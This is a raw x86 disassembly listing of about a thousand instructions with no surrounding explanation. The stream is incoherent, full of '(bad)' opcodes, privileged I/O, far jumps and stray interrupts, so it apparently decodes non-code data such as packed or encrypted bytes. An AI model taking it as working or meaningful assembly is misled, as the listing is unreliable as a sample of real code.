  40c13c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c13d:	xor    dl,BYTE PTR [edx+0x45c3b5f8]
  40c143:	mov    dh,0xcf
  40c145:	push   esp
  40c146:	sbb    DWORD PTR ds:0x747b9ab0,eax
  40c14c:	imul   edx,DWORD PTR ds:0x44a68f9f,0xffffffc0
  40c153:	inc    esi
  40c154:	add    al,0xe6
  40c156:	and    ebp,edx
  40c158:	jmp    0xaf0f5ddc
  40c15d:	into   
  40c15e:	xchg   ebp,eax
  40c15f:	push   ebp
  40c160:	in     eax,0xfa
  40c162:	dec    esi
  40c163:	dec    si
  40c166:	xchg   ebp,eax
  40c167:	stc    
  40c168:	xchg   ecx,eax
  40c169:	(bad)  
  40c16b:	push   edi
  40c16c:	aaa    
  40c16d:	bound  ebp,QWORD PTR [edx+0x38]
  40c170:	and    ah,cl
  40c172:	sbb    DWORD PTR [ecx-0x43],esi
  40c175:	loope  0x40c1e3
  40c177:	fcmovnbe st,st(2)
  40c179:	idiv   DWORD PTR [eax-0x7515615a]
  40c17f:	inc    esp
  40c180:	sbb    eax,0x3fa3ae60
  40c185:	imul   esp,DWORD PTR [edx+0x70],0xffffff9b
  40c189:	in     al,0xf0
  40c18b:	pop    edi
  40c18c:	push   ss
  40c18d:	rol    bl,1
  40c18f:	add    edx,DWORD PTR [edx-0x1b]
  40c192:	pop    eax
  40c193:	sub    DWORD PTR ds:0xbc6ba5a,edx
  40c199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c19a:	clc    
  40c19b:	pop    ebp
  40c19c:	data16 jne 0x40c1f5
  40c19f:	loop   0x40c127
  40c1a1:	or     DWORD PTR [edx+0x48840566],esi
  40c1a7:	add    BYTE PTR [edi-0x14d02c88],bh
  40c1ad:	jne    0x40c20b
  40c1af:	sub    bh,ah
  40c1b1:	mov    edx,DWORD PTR [edx]
  40c1b3:	test   DWORD PTR [ebx-0x6b],esp
  40c1b6:	inc    ecx
  40c1b7:	dec    ecx
  40c1b8:	pusha  
  40c1b9:	or     ch,BYTE PTR [ebp-0x6]
  40c1bc:	adc    eax,0x2e28c87e
  40c1c1:	inc    esp
  40c1c2:	sub    ch,bh
  40c1c4:	cmp    edi,eax
  40c1c6:	mov    dl,BYTE PTR [eax+ebx*1]
  40c1c9:	mov    eax,ds:0x7bc238ed
  40c1ce:	je     0x40c18b
  40c1d0:	popf   
  40c1d1:	xchg   edx,eax
  40c1d2:	sahf   
  40c1d3:	(bad)  
  40c1d4:	jnp    0x40c1c9
  40c1d6:	push   esp
  40c1d7:	sub    DWORD PTR [edx-0x37e1049d],ebp
  40c1dd:	jle    0x40c1ea
  40c1df:	jecxz  0x40c162
  40c1e1:	pop    ebp
  40c1e2:	push   0x8cb358a9
  40c1e7:	xchg   ebx,eax
  40c1e8:	pop    ebp
  40c1e9:	jo     0x40c1d2
  40c1eb:	push   esi
  40c1ec:	and    ebx,esi
  40c1ee:	shr    BYTE PTR es:[edi-0x2b31e11],1
  40c1f5:	dec    esi
  40c1f6:	rol    edx,0x2b
  40c1f9:	int3   
  40c1fa:	outs   dx,BYTE PTR ds:[esi]
  40c1fb:	iret   
  40c1fc:	inc    ebx
  40c1fd:	ja     0x40c1d5
  40c1ff:	nop
  40c200:	rep stos DWORD PTR es:[edi],eax
  40c202:	jle    0x40c1b3
  40c204:	(bad)  
  40c205:	in     al,0x35
  40c207:	mov    ds:0xbe8afad5,al
  40c20c:	fstp   TBYTE PTR [edi]
  40c20e:	push   0x777a399a
  40c213:	jl     0x40c20c
  40c215:	sbb    BYTE PTR [ecx],dl
  40c217:	xor    edx,DWORD PTR [edi+0x207d2ba7]
  40c21d:	adc    eax,0x54f3407f
  40c222:	or     BYTE PTR [bx+si+0x28],dh
  40c226:	lea    edi,[eax-0x56733719]
  40c22c:	outs   dx,DWORD PTR fs:[esi]
  40c22e:	in     al,dx
  40c22f:	iret   
  40c230:	pop    es
  40c231:	ficom  WORD PTR [eax+edx*2]
  40c234:	into   
  40c235:	push   ebx
  40c236:	out    0xb1,eax
  40c238:	mov    ds:0x5e5ecdea,al
  40c23d:	imul   edi,DWORD PTR [edx+0x18ec48dc],0xffffff91
  40c244:	pop    esp
  40c245:	sub    ebp,ebp
  40c247:	nop
  40c248:	je     0x40c1e5
  40c24a:	(bad)  
  40c24b:	aam    0x48
  40c24d:	sbb    ebp,DWORD PTR [edx]
  40c24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c250:	pop    edi
  40c251:	imul   eax,DWORD PTR [ebp-0x25],0xab908a72
  40c258:	push   ebp
  40c259:	cs inc edx
  40c25b:	add    ecx,DWORD PTR [ecx-0x72]
  40c25e:	(bad)  ds:0x9d87dec7
  40c265:	fadd   st,st(6)
  40c267:	mov    dh,0xd4
  40c269:	lds    esp,FWORD PTR [eax+eax*2+0x4c]
  40c26d:	fs jnp 0x40c28e
  40c270:	jns    0x40c2bf
  40c272:	bound  ebx,QWORD PTR [edx-0x72]
  40c275:	dec    ebx
  40c276:	mov    ch,0xd7
  40c278:	icebp  
  40c279:	and    eax,0x78a0d2d9
  40c27e:	stc    
  40c27f:	ins    BYTE PTR es:[edi],dx
  40c280:	or     ch,BYTE PTR [ebp+esi*1-0x7d]
  40c284:	data16 cmc 
  40c286:	scas   eax,DWORD PTR es:[edi]
  40c287:	fwait
  40c288:	hlt    
  40c289:	out    dx,al
  40c28a:	jmp    0xc95:0x83f46c91
  40c291:	ins    DWORD PTR es:[edi],dx
  40c292:	sub    al,0x9d
  40c294:	cmp    BYTE PTR [edx+0x66b48bed],ah
  40c29a:	adc    al,0xa9
  40c29c:	cmp    eax,0x3b96d8d6
  40c2a1:	pop    ebp
  40c2a2:	and    DWORD PTR [ecx+eiz*4],0xfffffff4
  40c2a6:	out    dx,eax
  40c2a7:	and    eax,0x3ba183c
  40c2ac:	xor    al,0xa9
  40c2ae:	aas    
  40c2af:	test   BYTE PTR [esi-0x7f],ah
  40c2b2:	xchg   edx,eax
  40c2b3:	jns    0x40c32c
  40c2b5:	mov    al,ds:0x1ea8b365
  40c2ba:	repnz int3 
  40c2bc:	mov    esp,DWORD PTR [ebx-0x5e]
  40c2bf:	rol    dl,cl
  40c2c1:	inc    edx
  40c2c2:	jae    0x40c24b
  40c2c4:	mov    BYTE PTR [ebp-0xd771a6c],dh
  40c2ca:	xchg   esi,eax
  40c2cb:	push   edi
  40c2cc:	xchg   ebx,eax
  40c2cd:	push   0x4dfc6b31
  40c2d2:	inc    edx
  40c2d3:	push   0x1a
  40c2d5:	les    ecx,FWORD PTR [ebx]
  40c2d7:	gs std 
  40c2d9:	and    esi,0xe3317d40
  40c2df:	cwde   
  40c2e0:	push   esp
  40c2e1:	xchg   ecx,eax
  40c2e2:	xor    eax,0x8ea0e2f1
  40c2e7:	lods   eax,DWORD PTR ds:[esi]
  40c2e8:	mov    ch,0xea
  40c2ea:	(bad)  
  40c2eb:	shr    BYTE PTR ds:0x7addbd74,cl
  40c2f1:	push   ebx
  40c2f2:	data16 stc 
  40c2f4:	mov    esp,0xbc38858f
  40c2f9:	pop    eax
  40c2fa:	xlat   BYTE PTR ds:[ebx]
  40c2fb:	retf   0x151
  40c2fe:	cdq    
  40c2ff:	ret    
  40c300:	push   0x47
  40c302:	mov    ds:0x503ed269,eax
  40c307:	lock mov dl,0x39
  40c30a:	sub    edx,ecx
  40c30c:	rcr    BYTE PTR [ebp+edx*4+0x10],0x2a
  40c311:	jmp    0x40c33d
  40c313:	xor    eax,0x9942cd3e
  40c318:	jmp    0x40c2ae
  40c31a:	dec    edx
  40c31b:	mov    ds:0x4796d34f,eax
  40c320:	popa   
  40c321:	in     al,dx
  40c322:	push   edi
  40c323:	inc    esi
  40c324:	push   eax
  40c325:	pop    ebx
  40c326:	mov    ds:0x92de1693,al
  40c32b:	ins    DWORD PTR es:[edi],dx
  40c32c:	and    BYTE PTR [edx+0x72],bl
  40c32f:	xor    DWORD PTR [ecx-0x551fec9f],0x54
  40c336:	jmp    0x40c399
  40c338:	pop    edx
  40c339:	add    bh,BYTE PTR [edi+0x34]
  40c33c:	jecxz  0x40c2f0
  40c33e:	adc    DWORD PTR [edx+edx*8+0x6b117c0b],ebx
  40c345:	and    eax,DWORD PTR [ecx-0x4d]
  40c348:	xchg   edi,eax
  40c349:	push   edx
  40c34a:	retf   0xb5ce
  40c34d:	lods   eax,DWORD PTR ds:[esi]
  40c34e:	push   eax
  40c34f:	mov    esi,0xab576149
  40c354:	mov    ds:0x634efc30,eax
  40c359:	int    0x27
  40c35b:	je     0x40c3a6
  40c35d:	jo     0x40c32a
  40c35f:	inc    esp
  40c360:	mov    esp,0xe681b55f
  40c365:	lods   al,BYTE PTR ds:[esi]
  40c366:	add    al,0x80
  40c368:	mov    ds:0xaeb75e77,eax
  40c36d:	sbb    al,0x86
  40c36f:	sahf   
  40c370:	nop
  40c371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c372:	into   
  40c373:	xchg   ecx,eax
  40c374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c375:	jmp    0x3a430ea5
  40c37a:	and    eax,0xe2aa4a9c
  40c37f:	jecxz  0x40c3b1
  40c381:	xchg   BYTE PTR ds:0xf55703eb,al
  40c387:	sbb    edx,esp
  40c389:	das    
  40c38a:	pop    ss
  40c38b:	xor    cl,0xe6
  40c38e:	es adc al,0x1
  40c391:	shl    DWORD PTR [eax-0x3eb9198a],0x53
  40c398:	gs leave 
  40c39a:	mov    ecx,0xe02f8cd9
  40c39f:	ja     0x40c405
  40c3a1:	sbb    BYTE PTR [esi],ch
  40c3a3:	and    BYTE PTR [ecx-0x5bc1b4c5],dh
  40c3a9:	xchg   esi,eax
  40c3aa:	mov    al,0xdc
  40c3ac:	(bad)  
  40c3ad:	mov    eax,ds:0x5542f297
  40c3b2:	pop    ds
  40c3b3:	xchg   edx,eax
  40c3b4:	fs aam 0xed
  40c3b7:	iret   
  40c3b8:	lods   eax,DWORD PTR ds:[esi]
  40c3b9:	or     BYTE PTR [eax+0x11],bl
  40c3bc:	mov    dh,0xc3
  40c3be:	nop
  40c3bf:	mov    dl,0x9d
  40c3c1:	std    
  40c3c2:	mov    eax,0x35a3fa13
  40c3c7:	push   ebp
  40c3c8:	cmp    esi,esp
  40c3ca:	loop   0x40c3af
  40c3cc:	mov    cl,0xba
  40c3ce:	in     eax,dx
  40c3cf:	sbb    eax,0x9b63aef3
  40c3d4:	jg     0x40c3ac
  40c3d6:	outs   dx,DWORD PTR ds:[esi]
  40c3d7:	push   eax
  40c3d8:	je     0x40c377
  40c3da:	sub    edx,DWORD PTR [eax-0x12]
  40c3dd:	stos   DWORD PTR es:[edi],eax
  40c3de:	jl     0x40c3bd
  40c3e0:	and    eax,0x82ef5d90
  40c3e5:	jg     0x40c385
  40c3e7:	into   
  40c3e8:	pop    ebp
  40c3e9:	clc    
  40c3ea:	jle    0x40c397
  40c3ec:	mov    eax,ds:0xe24a4733
  40c3f1:	sub    al,0xcc
  40c3f3:	repnz pop ds
  40c3f5:	leave  
  40c3f6:	nop
  40c3f7:	dec    ecx
  40c3f8:	popa   
  40c3f9:	rcr    esp,0x74
  40c3fc:	repz lahf 
  40c3fe:	push   esp
  40c3ff:	and    edi,ebx
  40c401:	mov    edx,DWORD PTR [ebp+edi*1-0x21f38e9b]
  40c408:	cdq    
  40c409:	in     al,dx
  40c40a:	out    0x38,eax
  40c40c:	xchg   edi,eax
  40c40e:	push   cs
  40c40f:	jo     0x40c3bf
  40c411:	pusha  
  40c412:	mov    edx,0x5e6d6d06
  40c417:	pop    esi
  40c418:	outs   dx,BYTE PTR ds:[esi]
  40c419:	aad    0x1a
  40c41b:	sub    bh,BYTE PTR [ecx+ebx*4+0x36d839af]
  40c422:	mov    bl,0xe6
  40c424:	or     al,0x30
  40c426:	in     eax,dx
  40c427:	push   0x4aa6930c
  40c42c:	inc    esi
  40c42d:	ret    0x5951
  40c430:	mov    ebp,ebp
  40c432:	adc    DWORD PTR [edi],ebp
  40c434:	dec    edx
  40c435:	(bad)  
  40c436:	in     eax,dx
  40c437:	loope  0x40c4a1
  40c439:	fiadd  WORD PTR [edx-0x7aa6144]
  40c43f:	push   eax
  40c440:	sar    BYTE PTR [edx+0x75],1
  40c443:	adc    eax,ecx
  40c445:	sub    BYTE PTR [esi+0x4b],al
  40c448:	jg     0x40c454
  40c44a:	push   ss
  40c44b:	add    eax,eax
  40c44d:	nop
  40c44e:	in     eax,0xda
  40c450:	mov    ebx,0xad62a8b0
  40c455:	mov    bl,0x78
  40c457:	or     eax,0xd34f777
  40c45c:	rol    DWORD PTR [ecx+ebx*2-0xb],cl
  40c460:	push   ebx
  40c461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c462:	adc    BYTE PTR [ecx+ebp*4],dh
  40c465:	mov    edx,0xf8cd75ef
  40c46a:	fld    DWORD PTR [eax]
  40c46c:	pop    edi
  40c46d:	xor    BYTE PTR [ebp+0x53c2fd7],ah
  40c473:	popa   
  40c474:	lods   eax,DWORD PTR ds:[esi]
  40c475:	imul   ecx,DWORD PTR [eax],0xc4e7e820
  40c47b:	push   es
  40c47c:	add    cl,bh
  40c47e:	mov    bl,0x3f
  40c480:	in     al,0xbc
  40c482:	jge    0x40c440
  40c484:	mov    ds:0x906dd6b9,al
  40c489:	xor    BYTE PTR [esi],0xf1
  40c48c:	sar    DWORD PTR [edx+0x3852ac95],0xe1
  40c493:	cmp    BYTE PTR [eax-0x73b588fe],dh
  40c499:	and    edi,DWORD PTR [ebp+0x21]
  40c49c:	test   ebx,edi
  40c49e:	add    DWORD PTR [edx+0x25],esi
  40c4a1:	shl    DWORD PTR [edx+eax*8-0x3b9f8cfe],0x8c
  40c4a9:	aam    0xc3
  40c4ab:	out    dx,eax
  40c4ac:	fwait
  40c4ad:	aas    
  40c4ae:	mov    BYTE PTR [edi-0x49],dh
  40c4b1:	aaa    
  40c4b2:	in     al,dx
  40c4b3:	xchg   esi,eax
  40c4b4:	out    dx,eax
  40c4b5:	int3   
  40c4b6:	leave  
  40c4b7:	push   0xffffff8d
  40c4b9:	(bad)  
  40c4ba:	aam    0xd0
  40c4bc:	stos   BYTE PTR es:[edi],al
  40c4bd:	and    esi,0x4758685b
  40c4c3:	adc    eax,eax
  40c4c5:	jo     0x40c4ee
  40c4c7:	sti    
  40c4c8:	sub    BYTE PTR [ebx-0x21],0xad
  40c4cc:	add    ecx,0xffffffaf
  40c4cf:	int    0xe1
  40c4d1:	xchg   ecx,eax
  40c4d2:	sub    al,0xcc
  40c4d4:	gs cmp eax,0x7f971207
  40c4da:	mov    edx,0xb810c315
  40c4df:	ins    BYTE PTR es:[edi],dx
  40c4e0:	jmp    FWORD PTR [esi-0x20e822b9]
  40c4e6:	(bad)  
  40c4e7:	fcomp  DWORD PTR ds:0x77ceec4f
  40c4ed:	sbb    esp,DWORD PTR [esi-0x2]
  40c4f0:	bound  ebx,QWORD PTR [edx-0x4d]
  40c4f3:	xchg   ebp,eax
  40c4f4:	scas   eax,DWORD PTR es:[edi]
  40c4f5:	repnz pop ss
  40c4f7:	sbb    dh,bh
  40c4f9:	inc    edi
  40c4fa:	cmp    BYTE PTR ds:0x61bfc36e,al
  40c500:	in     al,0x7b
  40c502:	ret    0x85f7
  40c505:	rep stos BYTE PTR es:[edi],al
  40c507:	iret   
  40c508:	or     BYTE PTR [ebx],dh
  40c50a:	sbb    ah,dh
  40c50c:	adc    eax,eax
  40c50e:	aad    0x59
  40c510:	cld    
  40c511:	dec    ecx
  40c512:	(bad)
  40c516:	push   ebx
  40c517:	rol    BYTE PTR [edi+edx*1-0x74af28c0],0xec
  40c51f:	int3   
  40c520:	ror    BYTE PTR [ebp+0x6c],1
  40c523:	cld    
  40c524:	or     al,0x3a
  40c526:	jo     0x40c572
  40c528:	sbb    bh,cl
  40c52a:	jge    0x40c4d8
  40c52c:	loopne 0x40c4fb
  40c52e:	test   BYTE PTR [edi],cl
  40c530:	gs jp  0xe2298f7c
  40c537:	call   0xc11f:0x62ba6149
  40c53e:	arpl   WORD PTR [edx+0xc],di
  40c541:	mov    fs,WORD PTR [eax-0x70476b8c]
  40c547:	je     0x40c561
  40c549:	fdivr  DWORD PTR [edi]
  40c54b:	cdq    
  40c54c:	out    dx,eax
  40c54d:	jecxz  0x40c5c7
  40c54f:	cwde   
  40c550:	cmp    ecx,DWORD PTR [ecx+0x39]
  40c553:	push   esi
  40c554:	ret    0x6db1
  40c557:	iret   
  40c558:	push   0x797e2c6e
  40c55d:	mov    ecx,0xcef91d73
  40c562:	cli    
  40c563:	push   ds
  40c564:	nop
  40c565:	sub    dh,BYTE PTR [edx]
  40c567:	stos   DWORD PTR es:[edi],eax
  40c568:	xchg   DWORD PTR [ecx],esi
  40c56a:	or     al,0xa5
  40c56c:	pop    eax
  40c56d:	out    0x9a,al
  40c56f:	cmp    ah,ch
  40c571:	cld    
  40c572:	jmp    0xde88be9f
  40c577:	lods   al,BYTE PTR ds:[esi]
  40c578:	sub    ah,BYTE PTR [ebp-0x3adb4479]
  40c57e:	out    0xf0,eax
  40c580:	imul   ebp,DWORD PTR ss:[esi-0x77],0x1e384b5e
  40c588:	fs stos BYTE PTR es:[edi],al
  40c58a:	push   cs
  40c58b:	pop    eax
  40c58c:	loop   0x40c52c
  40c58e:	int    0xce
  40c590:	(bad)  
  40c591:	push   ecx
  40c592:	mov    DWORD PTR [ebx],edi
  40c594:	ds mov esp,0xd6ce4c1f
  40c59a:	pop    esp
  40c59b:	jle    0x40c572
  40c59d:	jae    0x40c52d
  40c59f:	pusha  
  40c5a0:	test   al,0xac
  40c5a2:	mov    dl,0x86
  40c5a4:	bound  ecx,QWORD PTR [edi+ebx*2+0x29aff38]
  40c5ab:	push   eax
  40c5ac:	xchg   edi,eax
  40c5ad:	div    BYTE PTR [eax]
  40c5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5b0:	jne    0x40c5d7
  40c5b2:	es (bad) 
  40c5b4:	mov    ebp,ecx
  40c5b6:	lods   eax,DWORD PTR ds:[esi]
  40c5b7:	and    eax,0xb5649728
  40c5bc:	cmp    bl,BYTE PTR ds:0x89117671
  40c5c2:	jmp    0x5ed0:0x8c147bed
  40c5c9:	mov    cl,0x8b
  40c5cb:	and    DWORD PTR cs:[esi-0xf],0x56
  40c5d0:	mov    ebp,0x26e78a30
  40c5d5:	dec    esp
  40c5d6:	les    di,DWORD PTR [ecx-0x69f4fa4]
  40c5dd:	fmul   DWORD PTR [edi]
  40c5df:	sbb    ah,dh
  40c5e1:	(bad)  
  40c5e2:	xchg   esi,eax
  40c5e3:	aam    0xf4
  40c5e5:	sub    al,cl
  40c5e7:	aam    0xbf
  40c5e9:	push   eax
  40c5ea:	push   edx
  40c5eb:	pop    ss
  40c5ec:	pushf  
  40c5ed:	mov    bl,0x6a
  40c5ef:	pop    ss
  40c5f0:	fstp   DWORD PTR [edx+eax*8-0x78d70eaa]
  40c5f7:	sub    ebp,edx
  40c5f9:	xchg   esi,eax
  40c5fa:	mov    ah,0x9b
  40c5fc:	add    al,ah
  40c5fe:	mov    eax,0x1fcc689f
  40c603:	mov    DWORD PTR [edx+ebp*1-0x7a],eax
  40c607:	out    0x38,al
  40c609:	jns    0x40c634
  40c60b:	nop
  40c60c:	int    0xb
  40c60e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c60f:	sbb    BYTE PTR [edx+eiz*2+0x30],al
  40c613:	stc    
  40c614:	cmc    
  40c615:	adc    BYTE PTR [ebx-0x729cc14d],cl
  40c61b:	out    0x79,al
  40c61d:	imul   DWORD PTR [edi-0x516270d7]
  40c623:	mov    al,0x75
  40c625:	bound  ecx,QWORD PTR [esi+0x9ea8c0f]
  40c62b:	pop    ds
  40c62c:	les    ecx,FWORD PTR [edx-0x4a]
  40c62f:	jmp    0x40c5c2
  40c631:	call   0x94fc:0xc8372b57
  40c638:	(bad)  
  40c639:	xchg   ebx,eax
  40c63a:	aas    
  40c63b:	cdq    
  40c63c:	aas    
  40c63d:	pop    edx
  40c63e:	sahf   
  40c63f:	push   edi
  40c640:	mov    esp,0x562fb73b
  40c645:	cmp    DWORD PTR [edx],edx
  40c647:	sub    al,0x41
  40c649:	enter  0x1db5,0xbf
  40c64d:	push   0x65db9dcb
  40c652:	xor    DWORD PTR [ebp+0x73],esp
  40c655:	lods   al,BYTE PTR ds:[esi]
  40c656:	mov    ch,0xb8
  40c658:	hlt    
  40c659:	outs   dx,BYTE PTR ds:[esi]
  40c65a:	push   ecx
  40c65b:	in     eax,0xb7
  40c65d:	jge    0x40c67f
  40c65f:	xor    eax,0x337a190e
  40c664:	(bad)  
  40c665:	popf   
  40c666:	mov    edi,0x5631bc43
  40c66b:	nop
  40c66c:	mov    al,0x8d
  40c66e:	fiadd  DWORD PTR [ebp+0x72ff1996]
  40c674:	xchg   ecx,eax
  40c675:	ins    DWORD PTR es:[edi],dx
  40c676:	pop    ebp
  40c677:	call   0x1cb8:0x43a841ad
  40c67e:	sub    DWORD PTR [ecx],esi
  40c680:	xor    eax,0xf7051a47
  40c685:	jmp    0xc54b8765
  40c68a:	fisttp DWORD PTR ds:0x831aa8c5
  40c690:	dec    esp
  40c691:	call   FWORD PTR [ecx+0x5ebc9dfc]
  40c697:	add    edi,edx
  40c699:	or     DWORD PTR [ebx+eax*1+0x51e82857],esi
  40c6a0:	addr16 jmp 0x6cfb3a4f
  40c6a6:	mov    esp,0xcec3d54c
  40c6ab:	jmp    0xbeab:0x75f946c7
  40c6b2:	cmp    DWORD PTR [esp+edi*8],eax
  40c6b5:	adc    ah,BYTE PTR ds:0xd3af4afd
  40c6bb:	lock fisubr WORD PTR ds:[edi-0x72]
  40c6c0:	xchg   esi,eax
  40c6c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6c2:	and    eax,DWORD PTR [esi-0x2cdf66b4]
  40c6c8:	std    
  40c6c9:	adc    al,0xdc
  40c6cb:	icebp  
  40c6cc:	or     ah,BYTE PTR ds:[ecx-0x78]
  40c6d0:	xchg   esp,eax
  40c6d1:	inc    edi
  40c6d2:	int    0x26
  40c6d4:	mov    al,ds:0x97cc43a9
  40c6d9:	or     ecx,DWORD PTR [ebx]
  40c6db:	push   eax
  40c6dc:	repnz dec esp
  40c6de:	loop   0x40c6fb
  40c6e0:	out    dx,eax
  40c6e1:	jae    0x40c6ee
  40c6e3:	jnp    0x40c735
  40c6e5:	ror    BYTE PTR [ecx+0xd26aaed],1
  40c6eb:	push   esp
  40c6ec:	test   eax,0x3b697fb2
  40c6f1:	jne    0x40c6c2
  40c6f3:	push   es
  40c6f4:	add    al,0x34
  40c6f6:	loop   0x40c685
  40c6f8:	iret   
  40c6f9:	xchg   ebx,eax
  40c6fa:	pusha  
  40c6fb:	call   0x9a54:0x394b02aa
  40c702:	in     eax,0xde
  40c704:	stos   BYTE PTR es:[edi],al
  40c705:	enter  0x936c,0x8b
  40c709:	lahf   
  40c70a:	cmp    ch,BYTE PTR [ebx+eax*4-0x13dc7cec]
  40c711:	jae    0x40c72b
  40c713:	xchg   ecx,eax
  40c714:	es lahf 
  40c716:	dec    eax
  40c717:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40c719:	cmp    al,0x30
  40c71b:	dec    edi
  40c71c:	test   al,0xd8
  40c71e:	(bad)  
  40c71f:	cs nop
  40c721:	ss dec ebp
  40c723:	sahf   
  40c724:	add    BYTE PTR [ecx],al
  40c726:	aas    
  40c727:	sub    eax,0xd672f845
  40c72c:	mov    ebp,ebp
  40c72e:	popa   
  40c72f:	into   
  40c730:	addr16 das 
  40c732:	push   cs
  40c733:	ret    
  40c734:	adc    edx,DWORD PTR [ecx+0x5a]
  40c737:	or     al,0xf7
  40c739:	test   eax,0x1e70da52
  40c73e:	or     ah,cl
  40c740:	lds    edi,FWORD PTR [eax+0x2e]
  40c743:	push   eax
  40c744:	je     0x40c735
  40c746:	shr    DWORD PTR [edx+0x11c9809],1
  40c74c:	outs   dx,DWORD PTR ds:[esi]
  40c74d:	mov    ah,0x36
  40c74f:	mov    ebp,0x5a1e98bb
  40c754:	cmp    al,0x2
  40c756:	ret    0xb56
  40c759:	sahf   
  40c75a:	in     eax,dx
  40c75b:	dec    eax
  40c75c:	outs   dx,BYTE PTR ds:[esi]
  40c75d:	mov    ds:0xff03c685,al
  40c762:	inc    edx
  40c763:	pop    esi
  40c764:	xchg   edx,eax
  40c765:	sbb    BYTE PTR es:0xed130060,ch
  40c76c:	jo     0x40c73d
  40c76e:	mov    ebx,0x9fcdc908
  40c773:	adc    eax,0xd776a3af
  40c778:	sbb    eax,0x9cc1b38d
  40c77d:	fist   DWORD PTR [ebp-0x69927fd0]
  40c783:	fs enter 0xe483,0x44
  40c788:	repz rcr DWORD PTR [edx+0x18],0xa6
  40c78d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c78e:	fndisi(8087 only) 
  40c790:	add    edi,DWORD PTR [edi+eiz*4-0x5b0f63b7]
  40c797:	xor    BYTE PTR [ebp-0x10436acb],0xc0
  40c79e:	jge    0x40c785
  40c7a0:	fcomp  st(4)
  40c7a2:	mov    eax,ds:0x127d3514
  40c7a7:	(bad)  
  40c7a8:	(bad)  
  40c7a9:	fdivr  DWORD PTR [ebp-0x1c]
  40c7ac:	sub    al,0xef
  40c7ae:	xchg   ecx,eax
  40c7af:	and    dh,al
  40c7b1:	cmp    ecx,DWORD PTR [ecx]
  40c7b3:	aad    0x42
  40c7b5:	jl     0x40c81d
  40c7b7:	or     DWORD PTR [eax+0x42],ebx
  40c7ba:	push   ebp
  40c7bb:	imul   eax,DWORD PTR ds:0xe3930227,0xffffff8e
  40c7c2:	add    ah,bl
  40c7c4:	sti    
  40c7c5:	repz lds ebx,FWORD PTR [edi]
  40c7c8:	in     al,dx
  40c7c9:	mov    edi,0x6aa85a83
  40c7ce:	dec    esp
  40c7cf:	xor    DWORD PTR [ecx+0x5acd7d9e],0x1c
  40c7d6:	sub    esi,DWORD PTR [ecx+0x61c50a4a]
  40c7dc:	jl     0x40c84f
  40c7de:	out    0x59,eax
  40c7e0:	je     0x40c7a2
  40c7e2:	adc    DWORD PTR [esi],eax
  40c7e4:	jp     0x40c863
  40c7e6:	cld    
  40c7e7:	aad    0x41
  40c7e9:	shl    DWORD PTR [esi+0x1fa531a9],1
  40c7ef:	dec    ebp
  40c7f0:	inc    ecx
  40c7f1:	xor    DWORD PTR fs:[ecx],eax
  40c7f4:	push   ebp
  40c7f5:	pusha  
  40c7f6:	push   ebp
  40c7f7:	push   eax
  40c7f8:	jecxz  0x40c781
  40c7fa:	sbb    eax,0xf42ffe66
  40c7ff:	cld    
  40c800:	adc    bl,BYTE PTR [eax-0x42]
  40c803:	mov    edi,0xa5ec854b
  40c808:	test   al,0x52
  40c80a:	in     al,0x2c
  40c80c:	mov    al,0x9b
  40c80e:	test   ch,cl
  40c810:	push   0xc
  40c812:	ins    BYTE PTR es:[edi],dx
  40c813:	out    0xec,eax
  40c815:	adc    eax,0x55ea8738
  40c81a:	pop    ss
  40c81b:	push   edi
  40c81c:	pop    es
  40c81d:	xchg   ebp,eax
  40c81e:	shr    DWORD PTR [esi+0x47],1
  40c821:	jne    0x40c81f
  40c823:	jp     0x40c7d0
  40c825:	cmc    
  40c826:	in     al,0x29
  40c828:	fadd   st(2),st
  40c82a:	dec    esi
  40c82b:	xchg   esp,eax
  40c82c:	test   BYTE PTR [edi+0x4e],0xd8
  40c830:	sbb    BYTE PTR [edx],0x53
  40c833:	adc    ecx,esp
  40c835:	sbb    BYTE PTR es:[edx+eax*1-0x7dbe7552],al
  40c83d:	mov    cl,0x2
  40c83f:	dec    esi
  40c840:	ror    DWORD PTR [edi-0x31],cl
  40c843:	out    0x5c,al
  40c845:	fcomp  st(4)
  40c847:	inc    edi
  40c848:	dec    eax
  40c849:	outs   dx,DWORD PTR ds:[esi]
  40c84a:	(bad)  
  40c84b:	imul   ebx,ebp,0x9
  40c84e:	pop    es
  40c84f:	(bad)  
  40c850:	scas   al,BYTE PTR es:[edi]
  40c851:	jb     0x40c855
  40c853:	das    
  40c854:	pop    edx
  40c855:	fist   WORD PTR [esi+0x4]
  40c859:	outs   dx,DWORD PTR ds:[esi]
  40c85a:	cmp    BYTE PTR [ecx],0xba
  40c85d:	mov    ebp,DWORD PTR [edx]
  40c85f:	call   0xbc662e91
  40c864:	jno    0x40c86e
  40c866:	jmp    0x40c8e6
  40c868:	cwde   
  40c869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c86a:	pop    ss
  40c86b:	dec    eax
  40c86c:	bound  ebx,QWORD PTR [eax+0x38]
  40c86f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c870:	shl    BYTE PTR ds:0xb31d1d61,1
  40c876:	test   al,0xaa
  40c878:	dec    ebx
  40c879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c87a:	sub    bh,BYTE PTR [edi-0x58]
  40c87d:	pop    ebp
  40c87f:	xlat   BYTE PTR ds:[ebx]
  40c880:	ja     0x40c87b
  40c882:	aaa    
  40c883:	cs or  eax,0xfe5225f6
  40c889:	fisttp DWORD PTR [edx]
  40c88b:	lea    esi,[esp+edi*8]
  40c88e:	sub    esi,DWORD PTR [ebx+esi*2-0x20]
  40c892:	lds    ecx,FWORD PTR [esi+0x30]
  40c895:	xlat   BYTE PTR ds:[ebx]
  40c896:	sti    
  40c897:	(bad)  
  40c898:	popf   
  40c899:	pop    edx
  40c89a:	dec    ebx
  40c89b:	xor    al,0x8f
  40c89d:	ja     0x40c908
  40c89f:	gs mov cl,0x17
